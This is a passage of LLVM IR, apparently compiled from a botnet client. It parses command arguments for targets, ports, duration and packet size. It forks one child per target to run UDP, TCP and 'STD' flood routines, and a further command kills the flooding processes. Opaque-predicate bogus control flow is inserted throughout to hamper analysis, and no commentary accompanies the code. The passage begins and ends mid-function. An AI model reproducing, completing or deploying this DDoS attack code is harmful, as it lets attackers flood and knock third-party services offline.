  br i1 %754, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %746, label %755, label %756

; <label>:755:                                    ; preds = %originalBBpart2122, %724, %718, %originalBBpart2118, %690, %originalBBpart2114
  br label %1337

; <label>:756:                                    ; preds = %originalBBpart2122, %730
  %757 = load i8**, i8*** %4, align 8
  %758 = getelementptr inbounds i8*, i8** %757, i64 1
  %759 = load i8*, i8** %758, align 8
  store i8* %759, i8** %17, align 8
  %760 = load i8**, i8*** %4, align 8
  %761 = getelementptr inbounds i8*, i8** %760, i64 2
  %762 = load i8*, i8** %761, align 8
  %763 = call i32 @atoi(i8* %762) #9
  store i32 %763, i32* %18, align 4
  %764 = load i8**, i8*** %4, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 3
  %766 = load i8*, i8** %765, align 8
  %767 = call i32 @atoi(i8* %766) #9
  store i32 %767, i32* %19, align 4
  %768 = load i8**, i8*** %4, align 8
  %769 = getelementptr inbounds i8*, i8** %768, i64 4
  %770 = load i8*, i8** %769, align 8
  %771 = call i32 @atoi(i8* %770) #9
  store i32 %771, i32* %20, align 4
  %772 = load i32, i32* %3, align 4
  %773 = icmp eq i32 %772, 6
  br i1 %773, label %774, label %779

; <label>:774:                                    ; preds = %756
  %775 = load i8**, i8*** %4, align 8
  %776 = getelementptr inbounds i8*, i8** %775, i64 5
  %777 = load i8*, i8** %776, align 8
  %778 = call i32 @atoi(i8* %777) #9
  br label %780

; <label>:779:                                    ; preds = %756
  br label %780

; <label>:780:                                    ; preds = %779, %774
  %781 = phi i32 [ %778, %774 ], [ 10, %779 ]
  store i32 %781, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %782 = load i8*, i8** %17, align 8
  %783 = call i8* @strstr(i8* %782, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %784 = icmp ne i8* %783, null
  br i1 %784, label %785, label %852

; <label>:785:                                    ; preds = %780
  %786 = load i8*, i8** %17, align 8
  %787 = call i8* @strtok(i8* %786, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %787, i8** %23, align 8
  br label %788

; <label>:788:                                    ; preds = %originalBBpart2134, %785
  %789 = load i8*, i8** %23, align 8
  %790 = icmp ne i8* %789, null
  br i1 %790, label %791, label %851

; <label>:791:                                    ; preds = %788
  %792 = load i32, i32* @x.85
  %793 = load i32, i32* @y.86
  %794 = sub i32 %792, 1
  %795 = mul i32 %792, %794
  %796 = urem i32 %795, 2
  %797 = icmp eq i32 %796, 0
  %798 = icmp slt i32 %793, 10
  %799 = or i1 %797, %798
  br i1 %799, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %791
  %800 = call i32 @listFork()
  %801 = icmp ne i32 %800, 0
  %802 = load i32, i32* @x.85
  %803 = load i32, i32* @y.86
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br i1 %801, label %833, label %810

; <label>:810:                                    ; preds = %originalBBpart2126
  %811 = load i32, i32* @x.85
  %812 = load i32, i32* @y.86
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %810
  %819 = load i8*, i8** %23, align 8
  %820 = load i32, i32* %18, align 4
  %821 = load i32, i32* %19, align 4
  %822 = load i32, i32* %20, align 4
  %823 = load i32, i32* %21, align 4
  %824 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %819, i32 %820, i32 %821, i32 %822, i32 %823, i32 %824)
  call void @_exit(i32 0) #11
  %825 = load i32, i32* @x.85
  %826 = load i32, i32* @y.86
  %827 = sub i32 %825, 1
  %828 = mul i32 %825, %827
  %829 = urem i32 %828, 2
  %830 = icmp eq i32 %829, 0
  %831 = icmp slt i32 %826, 10
  %832 = or i1 %830, %831
  br i1 %832, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  unreachable

; <label>:833:                                    ; preds = %originalBBpart2126
  %834 = load i32, i32* @x.85
  %835 = load i32, i32* @y.86
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %833
  %842 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %842, i8** %23, align 8
  %843 = load i32, i32* @x.85
  %844 = load i32, i32* @y.86
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %788

; <label>:851:                                    ; preds = %788
  br label %863

; <label>:852:                                    ; preds = %780
  %853 = call i32 @listFork()
  %854 = icmp ne i32 %853, 0
  br i1 %854, label %855, label %856

; <label>:855:                                    ; preds = %852
  br label %1337

; <label>:856:                                    ; preds = %852
  %857 = load i8*, i8** %17, align 8
  %858 = load i32, i32* %18, align 4
  %859 = load i32, i32* %19, align 4
  %860 = load i32, i32* %20, align 4
  %861 = load i32, i32* %21, align 4
  %862 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %857, i32 %858, i32 %859, i32 %860, i32 %861, i32 %862)
  call void @_exit(i32 0) #11
  unreachable

; <label>:863:                                    ; preds = %851
  br label %864

; <label>:864:                                    ; preds = %863, %665
  %865 = load i8**, i8*** %4, align 8
  %866 = getelementptr inbounds i8*, i8** %865, i64 0
  %867 = load i8*, i8** %866, align 8
  %868 = call i32 @strcmp(i8* %867, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.557, i32 0, i32 0)) #9
  %869 = icmp ne i32 %868, 0
  br i1 %869, label %1039, label %870

; <label>:870:                                    ; preds = %864
  %871 = load i32, i32* @x.85
  %872 = load i32, i32* @y.86
  %873 = sub i32 %871, 1
  %874 = mul i32 %871, %873
  %875 = urem i32 %874, 2
  %876 = icmp eq i32 %875, 0
  %877 = icmp slt i32 %872, 10
  %878 = or i1 %876, %877
  br i1 %878, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %870
  %879 = load i32, i32* %3, align 4
  %880 = icmp slt i32 %879, 6
  %881 = load i32, i32* @x.85
  %882 = load i32, i32* @y.86
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %880, label %935, label %889

; <label>:889:                                    ; preds = %originalBBpart2138
  %890 = load i8**, i8*** %4, align 8
  %891 = getelementptr inbounds i8*, i8** %890, i64 3
  %892 = load i8*, i8** %891, align 8
  %893 = call i32 @atoi(i8* %892) #9
  %894 = icmp eq i32 %893, -1
  br i1 %894, label %935, label %895

; <label>:895:                                    ; preds = %889
  %896 = load i8**, i8*** %4, align 8
  %897 = getelementptr inbounds i8*, i8** %896, i64 2
  %898 = load i8*, i8** %897, align 8
  %899 = call i32 @atoi(i8* %898) #9
  %900 = icmp eq i32 %899, -1
  br i1 %900, label %935, label %901

; <label>:901:                                    ; preds = %895
  %902 = load i32, i32* %3, align 4
  %903 = icmp sgt i32 %902, 5
  br i1 %903, label %904, label %910

; <label>:904:                                    ; preds = %901
  %905 = load i8**, i8*** %4, align 8
  %906 = getelementptr inbounds i8*, i8** %905, i64 5
  %907 = load i8*, i8** %906, align 8
  %908 = call i32 @atoi(i8* %907) #9
  %909 = icmp slt i32 %908, 0
  br i1 %909, label %935, label %910

; <label>:910:                                    ; preds = %904, %901
  %911 = load i32, i32* %3, align 4
  %912 = icmp eq i32 %911, 7
  br i1 %912, label %913, label %936

; <label>:913:                                    ; preds = %910
  %914 = load i32, i32* @x.85
  %915 = load i32, i32* @y.86
  %916 = sub i32 %914, 1
  %917 = mul i32 %914, %916
  %918 = urem i32 %917, 2
  %919 = icmp eq i32 %918, 0
  %920 = icmp slt i32 %915, 10
  %921 = or i1 %919, %920
  br i1 %921, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %913
  %922 = load i8**, i8*** %4, align 8
  %923 = getelementptr inbounds i8*, i8** %922, i64 6
  %924 = load i8*, i8** %923, align 8
  %925 = call i32 @atoi(i8* %924) #9
  %926 = icmp slt i32 %925, 1
  %927 = load i32, i32* @x.85
  %928 = load i32, i32* @y.86
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %926, label %935, label %936

; <label>:935:                                    ; preds = %originalBBpart2142, %904, %895, %889, %originalBBpart2138
  br label %1337

; <label>:936:                                    ; preds = %originalBBpart2142, %910
  %937 = load i8**, i8*** %4, align 8
  %938 = getelementptr inbounds i8*, i8** %937, i64 1
  %939 = load i8*, i8** %938, align 8
  store i8* %939, i8** %24, align 8
  %940 = load i8**, i8*** %4, align 8
  %941 = getelementptr inbounds i8*, i8** %940, i64 2
  %942 = load i8*, i8** %941, align 8
  %943 = call i32 @atoi(i8* %942) #9
  store i32 %943, i32* %25, align 4
  %944 = load i8**, i8*** %4, align 8
  %945 = getelementptr inbounds i8*, i8** %944, i64 3
  %946 = load i8*, i8** %945, align 8
  %947 = call i32 @atoi(i8* %946) #9
  store i32 %947, i32* %26, align 4
  %948 = load i8**, i8*** %4, align 8
  %949 = getelementptr inbounds i8*, i8** %948, i64 4
  %950 = load i8*, i8** %949, align 8
  store i8* %950, i8** %27, align 8
  %951 = load i32, i32* %3, align 4
  %952 = icmp eq i32 %951, 7
  br i1 %952, label %953, label %958

; <label>:953:                                    ; preds = %936
  %954 = load i8**, i8*** %4, align 8
  %955 = getelementptr inbounds i8*, i8** %954, i64 6
  %956 = load i8*, i8** %955, align 8
  %957 = call i32 @atoi(i8* %956) #9
  br label %959

; <label>:958:                                    ; preds = %936
  br label %959

; <label>:959:                                    ; preds = %958, %953
  %960 = phi i32 [ %957, %953 ], [ 10, %958 ]
  %961 = load i32, i32* @x.85
  %962 = load i32, i32* @y.86
  %963 = sub i32 %961, 1
  %964 = mul i32 %961, %963
  %965 = urem i32 %964, 2
  %966 = icmp eq i32 %965, 0
  %967 = icmp slt i32 %962, 10
  %968 = or i1 %966, %967
  br i1 %968, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %959
  store i32 %960, i32* %28, align 4
  %969 = load i32, i32* %3, align 4
  %970 = icmp sgt i32 %969, 5
  %971 = load i32, i32* @x.85
  %972 = load i32, i32* @y.86
  %973 = sub i32 %971, 1
  %974 = mul i32 %971, %973
  %975 = urem i32 %974, 2
  %976 = icmp eq i32 %975, 0
  %977 = icmp slt i32 %972, 10
  %978 = or i1 %976, %977
  br i1 %978, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br i1 %970, label %979, label %984

; <label>:979:                                    ; preds = %originalBBpart2146
  %980 = load i8**, i8*** %4, align 8
  %981 = getelementptr inbounds i8*, i8** %980, i64 5
  %982 = load i8*, i8** %981, align 8
  %983 = call i32 @atoi(i8* %982) #9
  br label %985

; <label>:984:                                    ; preds = %originalBBpart2146
  br label %985

; <label>:985:                                    ; preds = %984, %979
  %986 = phi i32 [ %983, %979 ], [ 0, %984 ]
  %987 = load i32, i32* @x.85
  %988 = load i32, i32* @y.86
  %989 = sub i32 %987, 1
  %990 = mul i32 %987, %989
  %991 = urem i32 %990, 2
  %992 = icmp eq i32 %991, 0
  %993 = icmp slt i32 %988, 10
  %994 = or i1 %992, %993
  br i1 %994, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %985
  store i32 %986, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %995 = load i8*, i8** %24, align 8
  %996 = call i8* @strstr(i8* %995, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %997 = icmp ne i8* %996, null
  %998 = load i32, i32* @x.85
  %999 = load i32, i32* @y.86
  %1000 = sub i32 %998, 1
  %1001 = mul i32 %998, %1000
  %1002 = urem i32 %1001, 2
  %1003 = icmp eq i32 %1002, 0
  %1004 = icmp slt i32 %999, 10
  %1005 = or i1 %1003, %1004
  br i1 %1005, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br i1 %997, label %1006, label %1026

; <label>:1006:                                   ; preds = %originalBBpart2150
  %1007 = load i8*, i8** %24, align 8
  %1008 = call i8* @strtok(i8* %1007, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %1008, i8** %31, align 8
  br label %1009

; <label>:1009:                                   ; preds = %1023, %1006
  %1010 = load i8*, i8** %31, align 8
  %1011 = icmp ne i8* %1010, null
  br i1 %1011, label %1012, label %1025

; <label>:1012:                                   ; preds = %1009
  %1013 = call i32 @listFork()
  %1014 = icmp ne i32 %1013, 0
  br i1 %1014, label %1023, label %1015

; <label>:1015:                                   ; preds = %1012
  %1016 = load i8*, i8** %31, align 8
  %1017 = load i32, i32* %25, align 4
  %1018 = load i32, i32* %26, align 4
  %1019 = load i8*, i8** %27, align 8
  %1020 = load i32, i32* %29, align 4
  %1021 = load i32, i32* %28, align 4
  %1022 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %1016, i32 %1017, i32 %1018, i8* %1019, i32 %1020, i32 %1021, i32 %1022)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1023:                                   ; preds = %1012
  %1024 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %1024, i8** %31, align 8
  br label %1009

; <label>:1025:                                   ; preds = %1009
  br label %1038

; <label>:1026:                                   ; preds = %originalBBpart2150
  %1027 = call i32 @listFork()
  %1028 = icmp ne i32 %1027, 0
  br i1 %1028, label %1029, label %1030

; <label>:1029:                                   ; preds = %1026
  br label %1337

; <label>:1030:                                   ; preds = %1026
  %1031 = load i8*, i8** %24, align 8
  %1032 = load i32, i32* %25, align 4
  %1033 = load i32, i32* %26, align 4
  %1034 = load i8*, i8** %27, align 8
  %1035 = load i32, i32* %29, align 4
  %1036 = load i32, i32* %28, align 4
  %1037 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %1031, i32 %1032, i32 %1033, i8* %1034, i32 %1035, i32 %1036, i32 %1037)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1038:                                   ; preds = %1025
  br label %1039

; <label>:1039:                                   ; preds = %1038, %864
  %1040 = load i8**, i8*** %4, align 8
  %1041 = getelementptr inbounds i8*, i8** %1040, i64 0
  %1042 = load i8*, i8** %1041, align 8
  %1043 = call i32 @strcmp(i8* %1042, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.558, i32 0, i32 0)) #9
  %1044 = icmp ne i32 %1043, 0
  br i1 %1044, label %1213, label %1045

; <label>:1045:                                   ; preds = %1039
  %1046 = load i32, i32* %3, align 4
  %1047 = icmp slt i32 %1046, 4
  br i1 %1047, label %1076, label %1048

; <label>:1048:                                   ; preds = %1045
  %1049 = load i32, i32* @x.85
  %1050 = load i32, i32* @y.86
  %1051 = sub i32 %1049, 1
  %1052 = mul i32 %1049, %1051
  %1053 = urem i32 %1052, 2
  %1054 = icmp eq i32 %1053, 0
  %1055 = icmp slt i32 %1050, 10
  %1056 = or i1 %1054, %1055
  br i1 %1056, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %1048
  %1057 = load i8**, i8*** %4, align 8
  %1058 = getelementptr inbounds i8*, i8** %1057, i64 2
  %1059 = load i8*, i8** %1058, align 8
  %1060 = call i32 @atoi(i8* %1059) #9
  %1061 = icmp slt i32 %1060, 1
  %1062 = load i32, i32* @x.85
  %1063 = load i32, i32* @y.86
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br i1 %1061, label %1076, label %1070

; <label>:1070:                                   ; preds = %originalBBpart2154
  %1071 = load i8**, i8*** %4, align 8
  %1072 = getelementptr inbounds i8*, i8** %1071, i64 3
  %1073 = load i8*, i8** %1072, align 8
  %1074 = call i32 @atoi(i8* %1073) #9
  %1075 = icmp slt i32 %1074, 1
  br i1 %1075, label %1076, label %1093

; <label>:1076:                                   ; preds = %1070, %originalBBpart2154, %1045
  %1077 = load i32, i32* @x.85
  %1078 = load i32, i32* @y.86
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1076
  %1085 = load i32, i32* @x.85
  %1086 = load i32, i32* @y.86
  %1087 = sub i32 %1085, 1
  %1088 = mul i32 %1085, %1087
  %1089 = urem i32 %1088, 2
  %1090 = icmp eq i32 %1089, 0
  %1091 = icmp slt i32 %1086, 10
  %1092 = or i1 %1090, %1091
  br i1 %1092, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %1337

; <label>:1093:                                   ; preds = %1070
  %1094 = load i32, i32* @x.85
  %1095 = load i32, i32* @y.86
  %1096 = sub i32 %1094, 1
  %1097 = mul i32 %1094, %1096
  %1098 = urem i32 %1097, 2
  %1099 = icmp eq i32 %1098, 0
  %1100 = icmp slt i32 %1095, 10
  %1101 = or i1 %1099, %1100
  br i1 %1101, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1093
  %1102 = load i8**, i8*** %4, align 8
  %1103 = getelementptr inbounds i8*, i8** %1102, i64 1
  %1104 = load i8*, i8** %1103, align 8
  store i8* %1104, i8** %32, align 8
  %1105 = load i8**, i8*** %4, align 8
  %1106 = getelementptr inbounds i8*, i8** %1105, i64 2
  %1107 = load i8*, i8** %1106, align 8
  %1108 = call i32 @atoi(i8* %1107) #9
  store i32 %1108, i32* %33, align 4
  %1109 = load i8**, i8*** %4, align 8
  %1110 = getelementptr inbounds i8*, i8** %1109, i64 3
  %1111 = load i8*, i8** %1110, align 8
  %1112 = call i32 @atoi(i8* %1111) #9
  store i32 %1112, i32* %34, align 4
  %1113 = load i8*, i8** %32, align 8
  %1114 = call i8* @strstr(i8* %1113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %1115 = icmp ne i8* %1114, null
  %1116 = load i32, i32* @x.85
  %1117 = load i32, i32* @y.86
  %1118 = sub i32 %1116, 1
  %1119 = mul i32 %1116, %1118
  %1120 = urem i32 %1119, 2
  %1121 = icmp eq i32 %1120, 0
  %1122 = icmp slt i32 %1117, 10
  %1123 = or i1 %1121, %1122
  br i1 %1123, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br i1 %1115, label %1124, label %1188

; <label>:1124:                                   ; preds = %originalBBpart2162
  %1125 = load i32, i32* @x.85
  %1126 = load i32, i32* @y.86
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %1124
  %1133 = load i8*, i8** %32, align 8
  %1134 = call i8* @strtok(i8* %1133, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %1134, i8** %35, align 8
  %1135 = load i32, i32* @x.85
  %1136 = load i32, i32* @y.86
  %1137 = sub i32 %1135, 1
  %1138 = mul i32 %1135, %1137
  %1139 = urem i32 %1138, 2
  %1140 = icmp eq i32 %1139, 0
  %1141 = icmp slt i32 %1136, 10
  %1142 = or i1 %1140, %1141
  br i1 %1142, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br label %1143

; <label>:1143:                                   ; preds = %1185, %originalBBpart2166
  %1144 = load i32, i32* @x.85
  %1145 = load i32, i32* @y.86
  %1146 = sub i32 %1144, 1
  %1147 = mul i32 %1144, %1146
  %1148 = urem i32 %1147, 2
  %1149 = icmp eq i32 %1148, 0
  %1150 = icmp slt i32 %1145, 10
  %1151 = or i1 %1149, %1150
  br i1 %1151, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %1143
  %1152 = load i8*, i8** %35, align 8
  %1153 = icmp ne i8* %1152, null
  %1154 = load i32, i32* @x.85
  %1155 = load i32, i32* @y.86
  %1156 = sub i32 %1154, 1
  %1157 = mul i32 %1154, %1156
  %1158 = urem i32 %1157, 2
  %1159 = icmp eq i32 %1158, 0
  %1160 = icmp slt i32 %1155, 10
  %1161 = or i1 %1159, %1160
  br i1 %1161, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br i1 %1153, label %1162, label %1187

; <label>:1162:                                   ; preds = %originalBBpart2170
  %1163 = load i32, i32* @x.85
  %1164 = load i32, i32* @y.86
  %1165 = sub i32 %1163, 1
  %1166 = mul i32 %1163, %1165
  %1167 = urem i32 %1166, 2
  %1168 = icmp eq i32 %1167, 0
  %1169 = icmp slt i32 %1164, 10
  %1170 = or i1 %1168, %1169
  br i1 %1170, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %1162
  %1171 = call i32 @listFork()
  %1172 = icmp ne i32 %1171, 0
  %1173 = load i32, i32* @x.85
  %1174 = load i32, i32* @y.86
  %1175 = sub i32 %1173, 1
  %1176 = mul i32 %1173, %1175
  %1177 = urem i32 %1176, 2
  %1178 = icmp eq i32 %1177, 0
  %1179 = icmp slt i32 %1174, 10
  %1180 = or i1 %1178, %1179
  br i1 %1180, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br i1 %1172, label %1185, label %1181

; <label>:1181:                                   ; preds = %originalBBpart2174
  %1182 = load i8*, i8** %35, align 8
  %1183 = load i32, i32* %33, align 4
  %1184 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %1182, i32 %1183, i32 %1184)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1185:                                   ; preds = %originalBBpart2174
  %1186 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %1186, i8** %35, align 8
  br label %1143

; <label>:1187:                                   ; preds = %originalBBpart2170
  br label %1196

; <label>:1188:                                   ; preds = %originalBBpart2162
  %1189 = call i32 @listFork()
  %1190 = icmp ne i32 %1189, 0
  br i1 %1190, label %1191, label %1192

; <label>:1191:                                   ; preds = %1188
  br label %1337

; <label>:1192:                                   ; preds = %1188
  %1193 = load i8*, i8** %32, align 8
  %1194 = load i32, i32* %33, align 4
  %1195 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %1193, i32 %1194, i32 %1195)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1196:                                   ; preds = %1187
  %1197 = load i32, i32* @x.85
  %1198 = load i32, i32* @y.86
  %1199 = sub i32 %1197, 1
  %1200 = mul i32 %1197, %1199
  %1201 = urem i32 %1200, 2
  %1202 = icmp eq i32 %1201, 0
  %1203 = icmp slt i32 %1198, 10
  %1204 = or i1 %1202, %1203
  br i1 %1204, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %1196
  %1205 = load i32, i32* @x.85
  %1206 = load i32, i32* @y.86
  %1207 = sub i32 %1205, 1
  %1208 = mul i32 %1205, %1207
  %1209 = urem i32 %1208, 2
  %1210 = icmp eq i32 %1209, 0
  %1211 = icmp slt i32 %1206, 10
  %1212 = or i1 %1210, %1211
  br i1 %1212, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br label %1213

; <label>:1213:                                   ; preds = %originalBBpart2178, %1039
  %1214 = load i8**, i8*** %4, align 8
  %1215 = getelementptr inbounds i8*, i8** %1214, i64 0
  %1216 = load i8*, i8** %1215, align 8
  %1217 = call i32 @strcmp(i8* %1216, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.559, i32 0, i32 0)) #9
  %1218 = icmp ne i32 %1217, 0
  br i1 %1218, label %1319, label %1219

; <label>:1219:                                   ; preds = %1213
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %1220

; <label>:1220:                                   ; preds = %originalBBpart2206, %1219
  %1221 = load i64, i64* %37, align 8
  %1222 = load i64, i64* @numpids, align 8
  %1223 = icmp ult i64 %1221, %1222
  br i1 %1223, label %1224, label %1313

; <label>:1224:                                   ; preds = %1220
  %1225 = load i32, i32* @x.85
  %1226 = load i32, i32* @y.86
  %1227 = sub i32 %1225, 1
  %1228 = mul i32 %1225, %1227
  %1229 = urem i32 %1228, 2
  %1230 = icmp eq i32 %1229, 0
  %1231 = icmp slt i32 %1226, 10
  %1232 = or i1 %1230, %1231
  br i1 %1232, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %1224
  %1233 = load i32*, i32** @pids, align 8
  %1234 = load i64, i64* %37, align 8
  %1235 = getelementptr inbounds i32, i32* %1233, i64 %1234
  %1236 = load i32, i32* %1235, align 4
  %1237 = icmp ne i32 %1236, 0
  %1238 = load i32, i32* @x.85
  %1239 = load i32, i32* @y.86
  %1240 = sub i32 %1238, 1
  %1241 = mul i32 %1238, %1240
  %1242 = urem i32 %1241, 2
  %1243 = icmp eq i32 %1242, 0
  %1244 = icmp slt i32 %1239, 10
  %1245 = or i1 %1243, %1244
  br i1 %1245, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %1237, label %1246, label %1293

; <label>:1246:                                   ; preds = %originalBBpart2182
  %1247 = load i32, i32* @x.85
  %1248 = load i32, i32* @y.86
  %1249 = sub i32 %1247, 1
  %1250 = mul i32 %1247, %1249
  %1251 = urem i32 %1250, 2
  %1252 = icmp eq i32 %1251, 0
  %1253 = icmp slt i32 %1248, 10
  %1254 = or i1 %1252, %1253
  br i1 %1254, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1246
  %1255 = load i32*, i32** @pids, align 8
  %1256 = load i64, i64* %37, align 8
  %1257 = getelementptr inbounds i32, i32* %1255, i64 %1256
  %1258 = load i32, i32* %1257, align 4
  %1259 = call i32 @getpid() #5
  %1260 = icmp ne i32 %1258, %1259
  %1261 = load i32, i32* @x.85
  %1262 = load i32, i32* @y.86
  %1263 = sub i32 %1261, 1
  %1264 = mul i32 %1261, %1263
  %1265 = urem i32 %1264, 2
  %1266 = icmp eq i32 %1265, 0
  %1267 = icmp slt i32 %1262, 10
  %1268 = or i1 %1266, %1267
  br i1 %1268, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br i1 %1260, label %1269, label %1293

; <label>:1269:                                   ; preds = %originalBBpart2186
  %1270 = load i32, i32* @x.85
  %1271 = load i32, i32* @y.86
  %1272 = sub i32 %1270, 1
  %1273 = mul i32 %1270, %1272
  %1274 = urem i32 %1273, 2
  %1275 = icmp eq i32 %1274, 0
  %1276 = icmp slt i32 %1271, 10
  %1277 = or i1 %1275, %1276
  br i1 %1277, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1269
  %1278 = load i32*, i32** @pids, align 8
  %1279 = load i64, i64* %37, align 8
  %1280 = getelementptr inbounds i32, i32* %1278, i64 %1279
  %1281 = load i32, i32* %1280, align 4
  %1282 = call i32 @kill(i32 %1281, i32 9) #5
  %1283 = load i32, i32* %36, align 4
  %1284 = add nsw i32 %1283, 1
  store i32 %1284, i32* %36, align 4
  %1285 = load i32, i32* @x.85
  %1286 = load i32, i32* @y.86
  %1287 = sub i32 %1285, 1
  %1288 = mul i32 %1285, %1287
  %1289 = urem i32 %1288, 2
  %1290 = icmp eq i32 %1289, 0
  %1291 = icmp slt i32 %1286, 10
  %1292 = or i1 %1290, %1291
  br i1 %1292, label %originalBBpart2196, label %originalBB188alteredBB

originalBBpart2196:                               ; preds = %originalBB188
